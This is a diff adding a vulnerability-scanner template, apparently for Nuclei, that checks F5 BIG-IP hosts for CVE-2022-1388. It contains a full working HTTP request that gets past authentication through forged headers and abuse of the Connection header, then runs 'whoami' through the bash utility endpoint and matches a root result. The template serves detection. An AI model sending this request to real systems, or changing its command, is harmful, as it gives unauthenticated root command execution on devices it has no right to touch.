@@ -1,0 +1,38 @@
+id: cve-2022-1388
+info:
+  name: BIG-IP iControl REST Unauthenticated Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    BIG-IP iControl REST vulnerability identified that allows unauthenticated attackers to execute arbitrary commands on vulnerable systems.
+  reference:
+    - https://support.f5.com/csp/article/K23605346
+  classification:
+    cve-id: CVE-2022-1388
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+http:
+  - raw:
+      - |
+        POST /mgmt/tm/util/bash HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Content-Type: application/json
+        X-F5-Auth-Token: a
+        Authorization: Basic YWRtaW46
+        Content-Length: {{len('{"command": "run", "utilCmdArgs": "-c whoami"}')}}
+        Connection: close, X-F5-Auth-Token, X-Forwarded-For, Local-Ip-From-Httpd, X-F5-New-Authtok-Reqd, X-Forwarded-Server, X-Forwarded-Host
+
+        {"command": "run", "utilCmdArgs": "-c whoami"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "tm:util:bash:runstate"
+      - type: regex
+        regex:
+          - '\"commandResult\":\"root\\n\"'
